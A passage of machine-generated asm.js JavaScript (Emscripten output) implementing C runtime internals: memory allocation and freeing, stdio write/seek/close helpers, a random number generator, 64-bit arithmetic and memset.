        if ((v | 0) == 135) {
            b = (c[2582] | 0) + h | 0;
            c[2582] = b;
            if (b >>> 0 > (c[2583] | 0) >>> 0) c[2583] = b;
            j = c[2480] | 0;
            do
                if (j) {
                    b = 10344;
                    while (1) {
                        a = c[b >> 2] | 0;
                        d = b + 4 | 0;
                        e = c[d >> 2] | 0;
                        if ((g | 0) == (a + e | 0)) {
                            v = 145;
                            break
                        }
                        f = c[b + 8 >> 2] | 0;
                        if (!f) break;
                        else b = f
                    }
                    if (((v | 0) == 145 ? (c[b + 12 >> 2] & 8 | 0) == 0 : 0) ? j >>> 0 < g >>> 0 & j >>> 0 >= a >>> 0 : 0) {
                        c[d >> 2] = e + h;
                        w = j + 8 | 0;
                        w = (w & 7 | 0) == 0 ? 0 : 0 - w & 7;
                        v = j + w | 0;
                        w = (c[2477] | 0) + (h - w) | 0;
                        c[2480] = v;
                        c[2477] = w;
                        c[v + 4 >> 2] = w | 1;
                        c[v + w + 4 >> 2] = 40;
                        c[2481] = c[2596];
                        break
                    }
                    if (g >>> 0 < (c[2478] | 0) >>> 0) c[2478] = g;
                    d = g + h | 0;
                    b = 10344;
                    while (1) {
                        if ((c[b >> 2] | 0) == (d | 0)) {
                            v = 153;
                            break
                        }
                        a = c[b + 8 >> 2] | 0;
                        if (!a) break;
                        else b = a
                    }
                    if ((v | 0) == 153 ? (c[b + 12 >> 2] & 8 | 0) == 0 : 0) {
                        c[b >> 2] = g;
                        m = b + 4 | 0;
                        c[m >> 2] = (c[m >> 2] | 0) + h;
                        m = g + 8 | 0;
                        m = g + ((m & 7 | 0) == 0 ? 0 : 0 - m & 7) | 0;
                        b = d + 8 | 0;
                        b = d + ((b & 7 | 0) == 0 ? 0 : 0 - b & 7) | 0;
                        k = m + n | 0;
                        i = b - m - n | 0;
                        c[m + 4 >> 2] = n | 3;
                        do
                            if ((b | 0) != (j | 0)) {
                                if ((b | 0) == (c[2479] | 0)) {
                                    w = (c[2476] | 0) + i | 0;
                                    c[2476] = w;
                                    c[2479] = k;
                                    c[k + 4 >> 2] = w | 1;
                                    c[k + w >> 2] = w;
                                    break
                                }
                                a = c[b + 4 >> 2] | 0;
                                if ((a & 3 | 0) == 1) {
                                    h = a & -8;
                                    e = a >>> 3;
                                    d: do
                                        if (a >>> 0 < 256) {
                                            a = c[b + 8 >> 2] | 0;
                                            d = c[b + 12 >> 2] | 0;
                                            if ((d | 0) == (a | 0)) {
                                                c[2474] = c[2474] & ~(1 << e);
                                                break
                                            } else {
                                                c[a + 12 >> 2] = d;
                                                c[d + 8 >> 2] = a;
                                                break
                                            }
                                        } else {
                                            g = c[b + 24 >> 2] | 0;
                                            a = c[b + 12 >> 2] | 0;
                                            do
                                                if ((a | 0) == (b | 0)) {
                                                    e = b + 16 | 0;
                                                    d = e + 4 | 0;
                                                    a = c[d >> 2] | 0;
                                                    if (!a) {
                                                        a = c[e >> 2] | 0;
                                                        if (!a) {
                                                            a = 0;
                                                            break
                                                        } else d = e
                                                    }
                                                    while (1) {
                                                        e = a + 20 | 0;
                                                        f = c[e >> 2] | 0;
                                                        if (f | 0) {
                                                            a = f;
                                                            d = e;
                                                            continue
                                                        }
                                                        e = a + 16 | 0;
                                                        f = c[e >> 2] | 0;
                                                        if (!f) break;
                                                        else {
                                                            a = f;
                                                            d = e
                                                        }
                                                    }
                                                    c[d >> 2] = 0
                                                } else {
                                                    w = c[b + 8 >> 2] | 0;
                                                    c[w + 12 >> 2] = a;
                                                    c[a + 8 >> 2] = w
                                                }
                                            while (0);
                                            if (!g) break;
                                            d = c[b + 28 >> 2] | 0;
                                            e = 10200 + (d << 2) | 0;
                                            do
                                                if ((b | 0) != (c[e >> 2] | 0)) {
                                                    c[g + 16 + (((c[g + 16 >> 2] | 0) != (b | 0) & 1) << 2) >> 2] = a;
                                                    if (!a) break d
                                                } else {
                                                    c[e >> 2] = a;
                                                    if (a | 0) break;
                                                    c[2475] = c[2475] & ~(1 << d);
                                                    break d
                                                }
                                            while (0);
                                            c[a + 24 >> 2] = g;
                                            d = b + 16 | 0;
                                            e = c[d >> 2] | 0;
                                            if (e | 0) {
                                                c[a + 16 >> 2] = e;
                                                c[e + 24 >> 2] = a
                                            }
                                            d = c[d + 4 >> 2] | 0;
                                            if (!d) break;
                                            c[a + 20 >> 2] = d;
                                            c[d + 24 >> 2] = a
                                        }
                                    while (0);
                                    b = b + h | 0;
                                    f = h + i | 0
                                } else f = i;
                                b = b + 4 | 0;
                                c[b >> 2] = c[b >> 2] & -2;
                                c[k + 4 >> 2] = f | 1;
                                c[k + f >> 2] = f;
                                b = f >>> 3;
                                if (f >>> 0 < 256) {
                                    d = 9936 + (b << 1 << 2) | 0;
                                    a = c[2474] | 0;
                                    b = 1 << b;
                                    if (!(a & b)) {
                                        c[2474] = a | b;
                                        b = d;
                                        a = d + 8 | 0
                                    } else {
                                        a = d + 8 | 0;
                                        b = c[a >> 2] | 0
                                    }
                                    c[a >> 2] = k;
                                    c[b + 12 >> 2] = k;
                                    c[k + 8 >> 2] = b;
                                    c[k + 12 >> 2] = d;
                                    break
                                }
                                b = f >>> 8;
                                do
                                    if (!b) b = 0;
                                    else {
                                        if (f >>> 0 > 16777215) {
                                            b = 31;
                                            break
                                        }
                                        v = (b + 1048320 | 0) >>> 16 & 8;
                                        w = b << v;
                                        u = (w + 520192 | 0) >>> 16 & 4;
                                        w = w << u;
                                        b = (w + 245760 | 0) >>> 16 & 2;
                                        b = 14 - (u | v | b) + (w << b >>> 15) | 0;
                                        b = f >>> (b + 7 | 0) & 1 | b << 1
                                    }
                                while (0);
                                e = 10200 + (b << 2) | 0;
                                c[k + 28 >> 2] = b;
                                a = k + 16 | 0;
                                c[a + 4 >> 2] = 0;
                                c[a >> 2] = 0;
                                a = c[2475] | 0;
                                d = 1 << b;
                                if (!(a & d)) {
                                    c[2475] = a | d;
                                    c[e >> 2] = k;
                                    c[k + 24 >> 2] = e;
                                    c[k + 12 >> 2] = k;
                                    c[k + 8 >> 2] = k;
                                    break
                                }
                                a = f << ((b | 0) == 31 ? 0 : 25 - (b >>> 1) | 0);
                                d = c[e >> 2] | 0;
                                while (1) {
                                    if ((c[d + 4 >> 2] & -8 | 0) == (f | 0)) {
                                        v = 194;
                                        break
                                    }
                                    e = d + 16 + (a >>> 31 << 2) | 0;
                                    b = c[e >> 2] | 0;
                                    if (!b) {
                                        v = 193;
                                        break
                                    } else {
                                        a = a << 1;
                                        d = b
                                    }
                                }
                                if ((v | 0) == 193) {
                                    c[e >> 2] = k;
                                    c[k + 24 >> 2] = d;
                                    c[k + 12 >> 2] = k;
                                    c[k + 8 >> 2] = k;
                                    break
                                } else if ((v | 0) == 194) {
                                    v = d + 8 | 0;
                                    w = c[v >> 2] | 0;
                                    c[w + 12 >> 2] = k;
                                    c[v >> 2] = k;
                                    c[k + 8 >> 2] = w;
                                    c[k + 12 >> 2] = d;
                                    c[k + 24 >> 2] = 0;
                                    break
                                }
                            } else {
                                w = (c[2477] | 0) + i | 0;
                                c[2477] = w;
                                c[2480] = k;
                                c[k + 4 >> 2] = w | 1
                            }
                        while (0);
                        w = m + 8 | 0;
                        l = x;
                        return w | 0
                    }
                    b = 10344;
                    while (1) {
                        a = c[b >> 2] | 0;
                        if (a >>> 0 <= j >>> 0 ? (w = a + (c[b + 4 >> 2] | 0) | 0, w >>> 0 > j >>> 0) : 0) break;
                        b = c[b + 8 >> 2] | 0
                    }
                    f = w + -47 | 0;
                    a = f + 8 | 0;
                    a = f + ((a & 7 | 0) == 0 ? 0 : 0 - a & 7) | 0;
                    f = j + 16 | 0;
                    a = a >>> 0 < f >>> 0 ? j : a;
                    b = a + 8 | 0;
                    d = g + 8 | 0;
                    d = (d & 7 | 0) == 0 ? 0 : 0 - d & 7;
                    v = g + d | 0;
                    d = h + -40 - d | 0;
                    c[2480] = v;
                    c[2477] = d;
                    c[v + 4 >> 2] = d | 1;
                    c[v + d + 4 >> 2] = 40;
                    c[2481] = c[2596];
                    d = a + 4 | 0;
                    c[d >> 2] = 27;
                    c[b >> 2] = c[2586];
                    c[b + 4 >> 2] = c[2587];
                    c[b + 8 >> 2] = c[2588];
                    c[b + 12 >> 2] = c[2589];
                    c[2586] = g;
                    c[2587] = h;
                    c[2589] = 0;
                    c[2588] = b;
                    b = a + 24 | 0;
                    do {
                        v = b;
                        b = b + 4 | 0;
                        c[b >> 2] = 7
                    } while ((v + 8 | 0) >>> 0 < w >>> 0);
                    if ((a | 0) != (j | 0)) {
                        g = a - j | 0;
                        c[d >> 2] = c[d >> 2] & -2;
                        c[j + 4 >> 2] = g | 1;
                        c[a >> 2] = g;
                        b = g >>> 3;
                        if (g >>> 0 < 256) {
                            d = 9936 + (b << 1 << 2) | 0;
                            a = c[2474] | 0;
                            b = 1 << b;
                            if (!(a & b)) {
                                c[2474] = a | b;
                                b = d;
                                a = d + 8 | 0
                            } else {
                                a = d + 8 | 0;
                                b = c[a >> 2] | 0
                            }
                            c[a >> 2] = j;
                            c[b + 12 >> 2] = j;
                            c[j + 8 >> 2] = b;
                            c[j + 12 >> 2] = d;
                            break
                        }
                        b = g >>> 8;
                        if (b)
                            if (g >>> 0 > 16777215) d = 31;
                            else {
                                v = (b + 1048320 | 0) >>> 16 & 8;
                                w = b << v;
                                u = (w + 520192 | 0) >>> 16 & 4;
                                w = w << u;
                                d = (w + 245760 | 0) >>> 16 & 2;
                                d = 14 - (u | v | d) + (w << d >>> 15) | 0;
                                d = g >>> (d + 7 | 0) & 1 | d << 1
                            }
                        else d = 0;
                        e = 10200 + (d << 2) | 0;
                        c[j + 28 >> 2] = d;
                        c[j + 20 >> 2] = 0;
                        c[f >> 2] = 0;
                        b = c[2475] | 0;
                        a = 1 << d;
                        if (!(b & a)) {
                            c[2475] = b | a;
                            c[e >> 2] = j;
                            c[j + 24 >> 2] = e;
                            c[j + 12 >> 2] = j;
                            c[j + 8 >> 2] = j;
                            break
                        }
                        a = g << ((d | 0) == 31 ? 0 : 25 - (d >>> 1) | 0);
                        d = c[e >> 2] | 0;
                        while (1) {
                            if ((c[d + 4 >> 2] & -8 | 0) == (g | 0)) {
                                v = 216;
                                break
                            }
                            e = d + 16 + (a >>> 31 << 2) | 0;
                            b = c[e >> 2] | 0;
                            if (!b) {
                                v = 215;
                                break
                            } else {
                                a = a << 1;
                                d = b
                            }
                        }
                        if ((v | 0) == 215) {
                            c[e >> 2] = j;
                            c[j + 24 >> 2] = d;
                            c[j + 12 >> 2] = j;
                            c[j + 8 >> 2] = j;
                            break
                        } else if ((v | 0) == 216) {
                            v = d + 8 | 0;
                            w = c[v >> 2] | 0;
                            c[w + 12 >> 2] = j;
                            c[v >> 2] = j;
                            c[j + 8 >> 2] = w;
                            c[j + 12 >> 2] = d;
                            c[j + 24 >> 2] = 0;
                            break
                        }
                    }
                } else {
                    w = c[2478] | 0;
                    if ((w | 0) == 0 | g >>> 0 < w >>> 0) c[2478] = g;
                    c[2586] = g;
                    c[2587] = h;
                    c[2589] = 0;
                    c[2483] = c[2592];
                    c[2482] = -1;
                    b = 0;
                    do {
                        w = 9936 + (b << 1 << 2) | 0;
                        c[w + 12 >> 2] = w;
                        c[w + 8 >> 2] = w;
                        b = b + 1 | 0
                    } while ((b | 0) != 32);
                    w = g + 8 | 0;
                    w = (w & 7 | 0) == 0 ? 0 : 0 - w & 7;
                    v = g + w | 0;
                    w = h + -40 - w | 0;
                    c[2480] = v;
                    c[2477] = w;
                    c[v + 4 >> 2] = w | 1;
                    c[v + w + 4 >> 2] = 40;
                    c[2481] = c[2596]
                }
            while (0);
            b = c[2477] | 0;
            if (b >>> 0 > n >>> 0) {
                u = b - n | 0;
                c[2477] = u;
                w = c[2480] | 0;
                v = w + n | 0;
                c[2480] = v;
                c[v + 4 >> 2] = u | 1;
                c[w + 4 >> 2] = n | 3;
                w = w + 8 | 0;
                l = x;
                return w | 0
            }
        }
        c[(fb() | 0) >> 2] = 12;
        w = 0;
        l = x;
        return w | 0
    }

    function $a(a) {
        a = a | 0;
        var b = 0,
            d = 0,
            e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0;
        if (!a) return;
        d = a + -8 | 0;
        f = c[2478] | 0;
        a = c[a + -4 >> 2] | 0;
        b = a & -8;
        j = d + b | 0;
        do
            if (!(a & 1)) {
                e = c[d >> 2] | 0;
                if (!(a & 3)) return;
                h = d + (0 - e) | 0;
                g = e + b | 0;
                if (h >>> 0 < f >>> 0) return;
                if ((h | 0) == (c[2479] | 0)) {
                    a = j + 4 | 0;
                    b = c[a >> 2] | 0;
                    if ((b & 3 | 0) != 3) {
                        i = h;
                        b = g;
                        break
                    }
                    c[2476] = g;
                    c[a >> 2] = b & -2;
                    c[h + 4 >> 2] = g | 1;
                    c[h + g >> 2] = g;
                    return
                }
                d = e >>> 3;
                if (e >>> 0 < 256) {
                    a = c[h + 8 >> 2] | 0;
                    b = c[h + 12 >> 2] | 0;
                    if ((b | 0) == (a | 0)) {
                        c[2474] = c[2474] & ~(1 << d);
                        i = h;
                        b = g;
                        break
                    } else {
                        c[a + 12 >> 2] = b;
                        c[b + 8 >> 2] = a;
                        i = h;
                        b = g;
                        break
                    }
                }
                f = c[h + 24 >> 2] | 0;
                a = c[h + 12 >> 2] | 0;
                do
                    if ((a | 0) == (h | 0)) {
                        d = h + 16 | 0;
                        b = d + 4 | 0;
                        a = c[b >> 2] | 0;
                        if (!a) {
                            a = c[d >> 2] | 0;
                            if (!a) {
                                a = 0;
                                break
                            } else b = d
                        }
                        while (1) {
                            d = a + 20 | 0;
                            e = c[d >> 2] | 0;
                            if (e | 0) {
                                a = e;
                                b = d;
                                continue
                            }
                            d = a + 16 | 0;
                            e = c[d >> 2] | 0;
                            if (!e) break;
                            else {
                                a = e;
                                b = d
                            }
                        }
                        c[b >> 2] = 0
                    } else {
                        i = c[h + 8 >> 2] | 0;
                        c[i + 12 >> 2] = a;
                        c[a + 8 >> 2] = i
                    }
                while (0);
                if (f) {
                    b = c[h + 28 >> 2] | 0;
                    d = 10200 + (b << 2) | 0;
                    if ((h | 0) == (c[d >> 2] | 0)) {
                        c[d >> 2] = a;
                        if (!a) {
                            c[2475] = c[2475] & ~(1 << b);
                            i = h;
                            b = g;
                            break
                        }
                    } else {
                        c[f + 16 + (((c[f + 16 >> 2] | 0) != (h | 0) & 1) << 2) >> 2] = a;
                        if (!a) {
                            i = h;
                            b = g;
                            break
                        }
                    }
                    c[a + 24 >> 2] = f;
                    b = h + 16 | 0;
                    d = c[b >> 2] | 0;
                    if (d | 0) {
                        c[a + 16 >> 2] = d;
                        c[d + 24 >> 2] = a
                    }
                    b = c[b + 4 >> 2] | 0;
                    if (b) {
                        c[a + 20 >> 2] = b;
                        c[b + 24 >> 2] = a;
                        i = h;
                        b = g
                    } else {
                        i = h;
                        b = g
                    }
                } else {
                    i = h;
                    b = g
                }
            } else {
                i = d;
                h = d
            }
        while (0);
        if (h >>> 0 >= j >>> 0) return;
        a = j + 4 | 0;
        e = c[a >> 2] | 0;
        if (!(e & 1)) return;
        if (!(e & 2)) {
            a = c[2479] | 0;
            if ((j | 0) == (c[2480] | 0)) {
                j = (c[2477] | 0) + b | 0;
                c[2477] = j;
                c[2480] = i;
                c[i + 4 >> 2] = j | 1;
                if ((i | 0) != (a | 0)) return;
                c[2479] = 0;
                c[2476] = 0;
                return
            }
            if ((j | 0) == (a | 0)) {
                j = (c[2476] | 0) + b | 0;
                c[2476] = j;
                c[2479] = h;
                c[i + 4 >> 2] = j | 1;
                c[h + j >> 2] = j;
                return
            }
            f = (e & -8) + b | 0;
            d = e >>> 3;
            do
                if (e >>> 0 < 256) {
                    b = c[j + 8 >> 2] | 0;
                    a = c[j + 12 >> 2] | 0;
                    if ((a | 0) == (b | 0)) {
                        c[2474] = c[2474] & ~(1 << d);
                        break
                    } else {
                        c[b + 12 >> 2] = a;
                        c[a + 8 >> 2] = b;
                        break
                    }
                } else {
                    g = c[j + 24 >> 2] | 0;
                    a = c[j + 12 >> 2] | 0;
                    do
                        if ((a | 0) == (j | 0)) {
                            d = j + 16 | 0;
                            b = d + 4 | 0;
                            a = c[b >> 2] | 0;
                            if (!a) {
                                a = c[d >> 2] | 0;
                                if (!a) {
                                    d = 0;
                                    break
                                } else b = d
                            }
                            while (1) {
                                d = a + 20 | 0;
                                e = c[d >> 2] | 0;
                                if (e | 0) {
                                    a = e;
                                    b = d;
                                    continue
                                }
                                d = a + 16 | 0;
                                e = c[d >> 2] | 0;
                                if (!e) break;
                                else {
                                    a = e;
                                    b = d
                                }
                            }
                            c[b >> 2] = 0;
                            d = a
                        } else {
                            d = c[j + 8 >> 2] | 0;
                            c[d + 12 >> 2] = a;
                            c[a + 8 >> 2] = d;
                            d = a
                        }
                    while (0);
                    if (g | 0) {
                        a = c[j + 28 >> 2] | 0;
                        b = 10200 + (a << 2) | 0;
                        if ((j | 0) == (c[b >> 2] | 0)) {
                            c[b >> 2] = d;
                            if (!d) {
                                c[2475] = c[2475] & ~(1 << a);
                                break
                            }
                        } else {
                            c[g + 16 + (((c[g + 16 >> 2] | 0) != (j | 0) & 1) << 2) >> 2] = d;
                            if (!d) break
                        }
                        c[d + 24 >> 2] = g;
                        a = j + 16 | 0;
                        b = c[a >> 2] | 0;
                        if (b | 0) {
                            c[d + 16 >> 2] = b;
                            c[b + 24 >> 2] = d
                        }
                        a = c[a + 4 >> 2] | 0;
                        if (a | 0) {
                            c[d + 20 >> 2] = a;
                            c[a + 24 >> 2] = d
                        }
                    }
                }
            while (0);
            c[i + 4 >> 2] = f | 1;
            c[h + f >> 2] = f;
            if ((i | 0) == (c[2479] | 0)) {
                c[2476] = f;
                return
            }
        } else {
            c[a >> 2] = e & -2;
            c[i + 4 >> 2] = b | 1;
            c[h + b >> 2] = b;
            f = b
        }
        a = f >>> 3;
        if (f >>> 0 < 256) {
            d = 9936 + (a << 1 << 2) | 0;
            b = c[2474] | 0;
            a = 1 << a;
            if (!(b & a)) {
                c[2474] = b | a;
                a = d;
                b = d + 8 | 0
            } else {
                b = d + 8 | 0;
                a = c[b >> 2] | 0
            }
            c[b >> 2] = i;
            c[a + 12 >> 2] = i;
            c[i + 8 >> 2] = a;
            c[i + 12 >> 2] = d;
            return
        }
        a = f >>> 8;
        if (a)
            if (f >>> 0 > 16777215) a = 31;
            else {
                h = (a + 1048320 | 0) >>> 16 & 8;
                j = a << h;
                g = (j + 520192 | 0) >>> 16 & 4;
                j = j << g;
                a = (j + 245760 | 0) >>> 16 & 2;
                a = 14 - (g | h | a) + (j << a >>> 15) | 0;
                a = f >>> (a + 7 | 0) & 1 | a << 1
            }
        else a = 0;
        e = 10200 + (a << 2) | 0;
        c[i + 28 >> 2] = a;
        c[i + 20 >> 2] = 0;
        c[i + 16 >> 2] = 0;
        b = c[2475] | 0;
        d = 1 << a;
        do
            if (b & d) {
                b = f << ((a | 0) == 31 ? 0 : 25 - (a >>> 1) | 0);
                d = c[e >> 2] | 0;
                while (1) {
                    if ((c[d + 4 >> 2] & -8 | 0) == (f | 0)) {
                        a = 73;
                        break
                    }
                    e = d + 16 + (b >>> 31 << 2) | 0;
                    a = c[e >> 2] | 0;
                    if (!a) {
                        a = 72;
                        break
                    } else {
                        b = b << 1;
                        d = a
                    }
                }
                if ((a | 0) == 72) {
                    c[e >> 2] = i;
                    c[i + 24 >> 2] = d;
                    c[i + 12 >> 2] = i;
                    c[i + 8 >> 2] = i;
                    break
                } else if ((a | 0) == 73) {
                    h = d + 8 | 0;
                    j = c[h >> 2] | 0;
                    c[j + 12 >> 2] = i;
                    c[h >> 2] = i;
                    c[i + 8 >> 2] = j;
                    c[i + 12 >> 2] = d;
                    c[i + 24 >> 2] = 0;
                    break
                }
            } else {
                c[2475] = b | d;
                c[e >> 2] = i;
                c[i + 24 >> 2] = e;
                c[i + 12 >> 2] = i;
                c[i + 8 >> 2] = i
            }
        while (0);
        j = (c[2482] | 0) + -1 | 0;
        c[2482] = j;
        if (!j) a = 10352;
        else return;
        while (1) {
            a = c[a >> 2] | 0;
            if (!a) break;
            else a = a + 8 | 0
        }
        c[2482] = -1;
        return
    }

    function ab(a, b) {
        a = a | 0;
        b = b | 0;
        var d = 0;
        if (a) {
            d = N(b, a) | 0;
            if ((b | a) >>> 0 > 65535) d = ((d >>> 0) / (a >>> 0) | 0 | 0) == (b | 0) ? d : -1
        } else d = 0;
        a = _a(d) | 0;
        if (!a) return a | 0;
        if (!(c[a + -4 >> 2] & 3)) return a | 0;
        xb(a | 0, 0, d | 0) | 0;
        return a | 0
    }

    function bb(a) {
        a = a | 0;
        var b = 0,
            d = 0;
        b = l;
        l = l + 16 | 0;
        d = b;
        c[d >> 2] = ib(c[a + 60 >> 2] | 0) | 0;
        a = eb(aa(6, d | 0) | 0) | 0;
        l = b;
        return a | 0
    }

    function cb(a, b, d) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        var e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0;
        n = l;
        l = l + 48 | 0;
        k = n + 16 | 0;
        g = n;
        f = n + 32 | 0;
        i = a + 28 | 0;
        e = c[i >> 2] | 0;
        c[f >> 2] = e;
        j = a + 20 | 0;
        e = (c[j >> 2] | 0) - e | 0;
        c[f + 4 >> 2] = e;
        c[f + 8 >> 2] = b;
        c[f + 12 >> 2] = d;
        e = e + d | 0;
        h = a + 60 | 0;
        c[g >> 2] = c[h >> 2];
        c[g + 4 >> 2] = f;
        c[g + 8 >> 2] = 2;
        g = eb(da(146, g | 0) | 0) | 0;
        a: do
            if ((e | 0) != (g | 0)) {
                b = 2;
                while (1) {
                    if ((g | 0) < 0) break;
                    e = e - g | 0;
                    p = c[f + 4 >> 2] | 0;
                    o = g >>> 0 > p >>> 0;
                    f = o ? f + 8 | 0 : f;
                    b = (o << 31 >> 31) + b | 0;
                    p = g - (o ? p : 0) | 0;
                    c[f >> 2] = (c[f >> 2] | 0) + p;
                    o = f + 4 | 0;
                    c[o >> 2] = (c[o >> 2] | 0) - p;
                    c[k >> 2] = c[h >> 2];
                    c[k + 4 >> 2] = f;
                    c[k + 8 >> 2] = b;
                    g = eb(da(146, k | 0) | 0) | 0;
                    if ((e | 0) == (g | 0)) {
                        m = 3;
                        break a
                    }
                }
                c[a + 16 >> 2] = 0;
                c[i >> 2] = 0;
                c[j >> 2] = 0;
                c[a >> 2] = c[a >> 2] | 32;
                if ((b | 0) == 2) d = 0;
                else d = d - (c[f + 4 >> 2] | 0) | 0
            } else m = 3; while (0);
        if ((m | 0) == 3) {
            p = c[a + 44 >> 2] | 0;
            c[a + 16 >> 2] = p + (c[a + 48 >> 2] | 0);
            c[i >> 2] = p;
            c[j >> 2] = p
        }
        l = n;
        return d | 0
    }

    function db(a, b, d) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        var e = 0,
            f = 0,
            g = 0;
        f = l;
        l = l + 32 | 0;
        g = f;
        e = f + 20 | 0;
        c[g >> 2] = c[a + 60 >> 2];
        c[g + 4 >> 2] = 0;
        c[g + 8 >> 2] = b;
        c[g + 12 >> 2] = e;
        c[g + 16 >> 2] = d;
        if ((eb(ca(140, g | 0) | 0) | 0) < 0) {
            c[e >> 2] = -1;
            a = -1
        } else a = c[e >> 2] | 0;
        l = f;
        return a | 0
    }

    function eb(a) {
        a = a | 0;
        if (a >>> 0 > 4294963200) {
            c[(fb() | 0) >> 2] = 0 - a;
            a = -1
        }
        return a | 0
    }

    function fb() {
        return (gb() | 0) + 64 | 0
    }

    function gb() {
        return hb() | 0
    }

    function hb() {
        return 7008
    }

    function ib(a) {
        a = a | 0;
        return a | 0
    }

    function jb(b, d, e) {
        b = b | 0;
        d = d | 0;
        e = e | 0;
        var f = 0,
            g = 0;
        g = l;
        l = l + 32 | 0;
        f = g;
        c[b + 36 >> 2] = 3;
        if ((c[b >> 2] & 64 | 0) == 0 ? (c[f >> 2] = c[b + 60 >> 2], c[f + 4 >> 2] = 21523, c[f + 8 >> 2] = g + 16, fa(54, f | 0) | 0) : 0) a[b + 75 >> 0] = -1;
        f = cb(b, d, e) | 0;
        l = g;
        return f | 0
    }

    function kb() {
        return 10392
    }

    function lb(a) {
        a = a | 0;
        return 0
    }

    function mb(a) {
        a = a | 0;
        return
    }

    function nb() {
        var a = 0,
            b = 0;
        b = l;
        l = l + 16 | 0;
        a = ha(20, b | 0) | 0;
        l = b;
        return a | 0
    }

    function ob() {
        $(10456);
        return 10464
    }

    function pb() {
        ga(10456);
        return
    }

    function qb(a) {
        a = a | 0;
        var b = 0,
            d = 0;
        do
            if (a) {
                if ((c[a + 76 >> 2] | 0) <= -1) {
                    b = rb(a) | 0;
                    break
                }
                d = (lb(a) | 0) == 0;
                b = rb(a) | 0;
                if (!d) mb(a)
            } else {
                if (!(c[1844] | 0)) b = 0;
                else b = qb(c[1844] | 0) | 0;
                a = c[(ob() | 0) >> 2] | 0;
                if (a)
                    do {
                        if ((c[a + 76 >> 2] | 0) > -1) d = lb(a) | 0;
                        else d = 0;
                        if ((c[a + 20 >> 2] | 0) >>> 0 > (c[a + 28 >> 2] | 0) >>> 0) b = rb(a) | 0 | b;
                        if (d | 0) mb(a);
                        a = c[a + 56 >> 2] | 0
                    } while ((a | 0) != 0);
                pb()
            }
        while (0);
        return b | 0
    }

    function rb(a) {
        a = a | 0;
        var b = 0,
            d = 0,
            e = 0,
            f = 0,
            g = 0,
            h = 0;
        b = a + 20 | 0;
        h = a + 28 | 0;
        if ((c[b >> 2] | 0) >>> 0 > (c[h >> 2] | 0) >>> 0 ? (ma[c[a + 36 >> 2] & 3](a, 0, 0) | 0, (c[b >> 2] | 0) == 0) : 0) a = -1;
        else {
            d = a + 4 | 0;
            e = c[d >> 2] | 0;
            f = a + 8 | 0;
            g = c[f >> 2] | 0;
            if (e >>> 0 < g >>> 0) ma[c[a + 40 >> 2] & 3](a, e - g | 0, 1) | 0;
            c[a + 16 >> 2] = 0;
            c[h >> 2] = 0;
            c[b >> 2] = 0;
            c[f >> 2] = 0;
            c[d >> 2] = 0;
            a = 0
        }
        return a | 0
    }

    function sb(a) {
        a = a | 0;
        var b = 0;
        b = 9888;
        c[b >> 2] = a + -1;
        c[b + 4 >> 2] = 0;
        return
    }

    function tb() {
        var a = 0,
            b = 0,
            d = 0;
        b = 9888;
        b = Bb(c[b >> 2] | 0, c[b + 4 >> 2] | 0, 1284865837, 1481765933) | 0;
        b = wb(b | 0, y | 0, 1, 0) | 0;
        a = y;
        d = 9888;
        c[d >> 2] = b;
        c[d + 4 >> 2] = a;
        a = yb(b | 0, a | 0, 33) | 0;
        return a | 0
    }

    function ub() {}

    function vb(a, b, c, d) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        d = d | 0;
        d = b - d - (c >>> 0 > a >>> 0 | 0) >>> 0;
        return (y = d, a - c >>> 0 | 0) | 0
    }

    function wb(a, b, c, d) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        d = d | 0;
        c = a + c >>> 0;
        return (y = b + d + (c >>> 0 < a >>> 0 | 0) >>> 0, c | 0) | 0
    }

    function xb(b, d, e) {
        b = b | 0;
        d = d | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0,
            i = 0;
        h = b + e | 0;
        d = d & 255;
        if ((e | 0) >= 67) {
            while (b & 3) {
                a[b >> 0] = d;
                b = b + 1 | 0
            }
            f = h & -4 | 0;
            g = f - 64 | 0;
            i = d | d << 8 | d << 16 | d << 24;
            while ((b | 0) <= (g | 0)) {
                c[b >> 2] = i;
                c[b + 4 >> 2] = i;
                c[b + 8 >> 2] = i;
                c[b + 12 >> 2] = i;
                c[b + 16 >> 2] = i;
                c[b + 20 >> 2] = i;
                c[b + 24 >> 2] = i;
                c[b + 28 >> 2] = i;
                c[b + 32 >> 2] = i;
                c[b + 36 >> 2] = i;
                c[b + 40 >> 2] = i;
                c[b + 44 >> 2] = i;
                c[b + 48 >> 2] = i;
                c[b + 52 >> 2] = i;
                c[b + 56 >> 2] = i;
                c[b + 60 >> 2] = i;
                b = b + 64 | 0
            }
            while ((b | 0) < (f | 0)) {
                c[b >> 2] = i;
                b = b + 4 | 0
            }
        }
        while ((b | 0) < (h | 0)) {
            a[b >> 0] = d;
            b = b + 1 | 0
        }
        return h - e | 0
    }

    function yb(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        if ((c | 0) < 32) {
            y = b >>> c;
            return a >>> c | (b & (1 << c) - 1) << 32 - c
        }
        y = 0;
        return b >>> c - 32 | 0
    }

    function zb(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        if ((c | 0) < 32) {
            y = b << c | (a & (1 << c) - 1 << 32 - c) >>> 32 - c;
            return a << c
        }
        y = a << c - 32;
        return 0
    }

    function Ab(a, b) {
        a = a | 0;
        b = b | 0;
        var c = 0,
            d = 0,
            e = 0,
            f = 0;
        f = a & 65535;
        e = b & 65535;
        c = N(e, f) | 0;
        d = a >>> 16;
        a = (c >>> 16) + (N(e, d) | 0) | 0;
        e = b >>> 16;
        b = N(e, f) | 0;
        return (y = (a >>> 16) + (N(e, d) | 0) + (((a & 65535) + b | 0) >>> 16) | 0, a + b << 16 | c & 65535 | 0) | 0
    }

    function Bb(a, b, c, d) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        d = d | 0;
        var e = 0,
            f = 0;
        e = a;
        f = c;
        c = Ab(e, f) | 0;
        a = y;
        return (y = (N(b, f) | 0) + (N(d, e) | 0) + a | a & 0, c | 0 | 0) | 0
    }

    function Cb(a) {
        a = a | 0;
        var b = 0,
            d = 0;
        d = a + 15 & -16 | 0;
        b = c[i >> 2] | 0;
        a = b + d | 0;
